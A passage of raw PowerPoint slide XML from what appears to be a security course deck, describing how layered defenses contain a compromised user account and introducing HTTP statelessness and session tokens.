                </a:solidFill>
              </a:rPr>
              <a:t>Massive download attempts,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Logins from new country + odd device.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Alert triggers; security or on-call responds:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Account temporarily disabled,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sessions revoked,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IP blocked.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>End result:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>One layer (user account protection) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>failed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>But other layers turned a potential disaster into:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a small incident,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>with limited scope,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>quickly contained.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7B1F100C-4B40-DCDD-781B-E62D6CAD6F87}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>136</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="247342414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BF162-8337-7D69-10A2-FF0E31E6E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60139-FD60-958D-8D8B-B6E3E45D8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9E2FF-168D-FC7C-9D1C-CB2F0868C767}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Scenario:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Identity layer partially fails</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>User reused their password; attacker logs in successfully.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MFA? Maybe bypassed via phishing or not enabled for that user type.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Application layer kicks in</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The compromised account only has </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> role, not admin.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Authorization rules ensure:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>No access to /admin routes.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Limited data per tenant/user.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Result: attacker’s reach is limited from the start.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Service / data layers kick in</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Even if the attacker hits internal APIs through the compromised session:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Service mesh policies restrict which services can talk where.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Data layer enforces row-level security: user 123 can’t read user 456’s records.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Monitoring layer kicks in</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Unusual access pattern detected:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Massive download attempts,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Logins from new country + odd device.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Alert triggers; security or on-call responds:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Account temporarily disabled,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sessions revoked,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IP blocked.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>End result:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>One layer (user account protection) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>failed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>But other layers turned a potential disaster into:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a small incident,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>with limited scope,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>quickly contained.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F7124D35-589E-04C5-48ED-87AD99DC8141}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>137</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="102780514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82B1-6433-193D-0AB2-B0DBF3201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5A0E3-A744-12C9-F569-93D99A6C3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19B4C-F969-A177-C224-C5E65B81D033}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HTTP is the foundation of data communication on the World Wide Web, dictating how data is formatted and transmitted between web browsers (clients) and web servers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{42DFDA63-9F95-E980-0E96-29CD967AA95F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>139</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="164738314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DA705-29AB-79C0-A391-A0DFC1763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2BA35-605C-38D7-CAD1-037321190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CF55B-EFE3-6E6D-CC8E-6EFC2C7DDF64}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>is a STATELESS protocol, so we staple/tack </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>statefulness</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> onto HTTP sessions with Cookies, SID's, JWT, etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>HTTP communications can also contain sensitive information – credentials, forms with bank statements or PII</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>HTTP even 'benign' http conversations </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{89E30F23-B2B0-5DDC-A30A-A7C14BABBE24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>140</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="338354168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83396-0E88-3670-F780-9F20FD5ED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FE0BD-E7EC-2D3A-4734-AA701178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5A13B-886B-81DB-01C1-5D2758C43FCB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
